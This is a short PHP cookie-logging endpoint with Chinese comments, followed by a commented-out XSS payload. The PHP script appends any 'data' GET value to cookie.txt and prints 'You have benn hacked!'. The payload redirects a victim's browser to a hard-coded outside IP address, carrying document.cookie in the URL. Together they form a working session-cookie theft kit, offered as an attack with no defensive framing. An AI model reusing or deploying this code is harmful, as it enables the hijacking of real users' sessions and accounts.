<?php
// 检查 GET 参数是否存在
if (isset($_GET['data'])) {
    // 获取 GET 参数
    $data = $_GET['data'];

    // 指定保存的文件路径
    $file = 'cookie.txt';

    // 准备要保存的数据，包含时间戳
    $content = "$data\n";

    // 将数据写入文件（如果文件不存在，会自动创建）
    file_put_contents($file, $content, FILE_APPEND);
}
echo("You have benn hacked!")
?>


<!---
<script>window.location.href='http://123.56.165.53:30004/hack.php?data='+encodeURIComponent(document.cookie)</script>
>